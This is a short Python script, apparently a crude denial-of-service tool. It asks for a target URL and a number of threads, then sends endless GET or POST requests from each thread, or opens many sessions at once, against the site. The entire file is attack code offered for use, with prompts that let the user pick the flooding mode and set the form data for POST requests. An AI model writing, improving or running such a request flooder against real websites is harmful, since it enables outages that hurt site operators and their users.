# -*- coding: utf-8 -*-

import requests
import threading
 
 
def getDDOS(url): 
    while True:
        my_request = requests.get(url)
        status_of_request = my_request.status_code
        if status_of_request == 200:
            print("Successful request.")
        else:
            print("Error!")
 
 
def postDDOS(url, my_data):
    while True:
        my_request = requests.post(url, data=my_data)
        status_of_request = my_request.status_code
        if status_of_request == 200:
            print("Successful request.")
        else:
            print("Error!")
 
 
def sessionDDOS(url): 
 
    numb_sessions = int(input("Enter the number of connections: "))
    sessions = []
    for i in range(numb_sessions):
        sessions.append(requests.Session())
        my_request = sessions[i].get(url)
        status_of_request = my_request.status_code
        if status_of_request == 200:
            print("Successful request..")
        else:
            print("Error!")
 
 
repeat = True
while repeat:
    repeat = False
    question = input("What do you need, get, session or post request ?\n \
    To select get or post - enter \"get\" or \"post\" or \"session\".\n \
    For reference, enter - \"help\": ")
    question.lower()
 
    sendGet = True
    sendPost = True
    sendSession = True
 
    if question == "help":
        print("When get request HTML page code will be received.\n \
    With a post request, you can send certain data to the server. For example, login and password.")
        repeat = True
    elif question == "post":
        sendGet = False
        sendSession = False
    elif question == "get":
        sendPost = False
        sendSession = False
    elif question == "session":
        sendPost = False
        sendGet = False
    else:
        print("Go get a coffee. Normally, you can’t do the input, but you’re trying to finish it yourself, hacker is Mom’s.")
 
url = input("Enter the site URL: ")
 
if sendGet:
    numb_threads = int(input("Enter the number of threads: "))
    threads = []
    for i in range(numb_threads):
        threads.append(threading.Thread(target=getDDOS, kwargs={"url": url}))
        threads[i].start()
elif sendPost:
    numb_threads = int(input("Enter the number of threads: "))
    threads = []
    numb_sends = int(input("Enter the number of threads: "))
    inputs = []
    sends = []
    for i in range(numb_sends):
        inputs.append(input("Enter the name of the input field: "))
        sends.append(input("Enter the value of the input field: "))
    my_data = dict(zip(inputs, sends))
    for i in range(numb_threads):
        threads.append(threading.Thread(target=postDDOS, kwargs={"url": url, "my_data": my_data}))
        threads[i].start()
elif sendSession:
    sessionDDOS(url)
else:
    print("Error. Contact your software developer.")